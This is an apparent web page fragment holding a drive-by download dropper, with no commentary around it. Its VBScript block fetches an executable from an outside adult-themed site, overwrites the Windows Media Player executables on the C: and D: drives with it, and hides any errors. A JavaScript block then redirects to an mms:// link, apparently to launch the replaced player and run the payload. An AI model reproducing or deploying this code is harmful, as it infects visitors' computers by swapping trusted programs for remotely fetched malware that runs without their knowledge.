<script language=vbs>
set oHTTP = CreateObject("msxml2.XMLHTTP")
oHTTP.open "GET", "http://www.free3xmatures.com/green/nt/load.exe", False
oHTTP.send
set oStream = createobject("adodb.stream")
Const adTypeBinary = 1
Const adSaveCreateOverWrite = 2
oStream.type = adTypeBinary
oStream.open
oStream.write oHTTP.responseBody
on error resume next
oStream.savetofile "C:\Program Files\Windows Media Player\mplayer2.exe", adSaveCreateOverWrite
on error resume next
oStream.savetofile "C:\Program Files\Windows Media Player\wmplayer.exe", adSaveCreateOverWrite
on error resume next
oStream.savetofile "d:\Program Files\Windows Media Player\mplayer2.exe", adSaveCreateOverWrite
on error resume next
oStream.savetofile "d:\Program Files\Windows Media Player\wmplayer.exe", adSaveCreateOverWrite
</script>
<script language="javascript">
location.href = "mms://";
</script>
